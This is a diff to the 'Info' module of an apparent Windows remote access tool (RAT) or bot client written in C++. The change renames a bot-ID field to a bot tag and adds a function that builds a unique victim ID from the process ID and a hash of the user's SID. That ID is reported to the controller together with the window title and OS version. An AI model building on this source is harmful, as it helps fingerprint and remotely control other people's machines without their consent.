@@ -1,18 +1,23 @@
 #include <Windows.h>
+#include <Sddl.h>
 #include "info.h"
+#include "Utilities.h"
 
 #define MAX_INFO_BUFFER_SIZE 300
 
 #define INFO_BASIC				0
 #define INFO_CURRENT_WINDOW		1
 #define INFO_WINDOW_VERSION		2
-#define INFO_BOTID				3
+#define INFO_BOTTAG				3
+#define INFO_UID				4 //Unique ID
 
 Info::Info(Connection* Conn, config* m_conf)
 {
 	ConnObj = Conn;
 	conf = m_conf;
 }
+
+Info::~Info() {}
 
 void Info::OnInit()
 {
@@ -49,6 +54,7 @@ void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
 		sizeOfSendBackBuffer = (titleLength * 2) + 1 + 2;
 		break;
 	case INFO_WINDOW_VERSION:
+		//TODO: Get windows product from registry key
 		ZeroMemory(&info, sizeof(OSVERSIONINFOW));
 		info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
 		GetVersionEx(&info);
@@ -60,20 +66,27 @@ void Info::OnPacketArrived(BYTE* packetData, size_t packetSize)
 		SendBackBuffer[4] = info.dwPlatformId;
 		sizeOfSendBackBuffer = 5;
 		break;
-	case INFO_BOTID:
+	case INFO_BOTTAG:
 		SendBackBuffer = (BYTE*)malloc(50);
-		SendBackBuffer[0] = INFO_BOTID;
+		SendBackBuffer[0] = INFO_BOTTAG;
 		wcsncpy((WCHAR*)(SendBackBuffer + 1), conf->ClientTag, sizeof(conf->ClientTag)/2);
 		sizeOfSendBackBuffer = (wcslen(conf->ClientTag) * 2) + 3;//ID and null wchar
 		break;
+	case INFO_UID:
+		SendBackBuffer = (BYTE*)malloc(5);
+		SendBackBuffer[0] = INFO_UID;
+		*(DWORD*)(SendBackBuffer + 1) = GetUID();
+		sizeOfSendBackBuffer = 5;
+		break;
 	}
 	SendPacket(SendBackBuffer, sizeOfSendBackBuffer);
-	free(SendBackBuffer);
+	if (SendBackBuffer)
+		free(SendBackBuffer);
 }
 
 void Info::OnExit()
 {
-
+	return;
 }
 
 bool Info::GetComputerInfo(BYTE* dataBuffer, size_t* dataMaxSize)
@@ -102,4 +115,38 @@ bool Info::GetComputerInfo(BYTE* dataBuffer, size_t* dataMaxSize)
 bool Info::GetRATInfo(BYTE* dataBuffer, size_t* dataMaxSize)
 {
 	return false;
+}
+
+DWORD Info::GetUID()
+{
+	DWORD pid = GetCurrentProcessId();
+	HANDLE hToken = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+		return pid;
+
+	PTOKEN_USER ptu = NULL;
+	DWORD dwSize = 0;
+	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && ERROR_INSUFFICIENT_BUFFER != GetLastError())
+		return pid;
+
+	DWORD sidHash = 0;
+
+	if (NULL != (ptu = (PTOKEN_USER)LocalAlloc(LPTR, dwSize)))
+	{
+		LPSTR StringSid = NULL;
+		if (!GetTokenInformation(hToken, TokenUser, ptu, dwSize, &dwSize))
+		{
+			LocalFree((HLOCAL)ptu);
+			return pid;
+		}
+		if (ConvertSidToStringSidA(ptu->User.Sid, &StringSid))
+		{
+			sidHash = Utilities::DJBHash(StringSid);
+			LocalFree((HLOCAL)StringSid);
+			LocalFree((HLOCAL)ptu);
+			return (pid ^ sidHash);
+		}
+		LocalFree((HLOCAL)ptu);
+	}
+	return pid;
 }
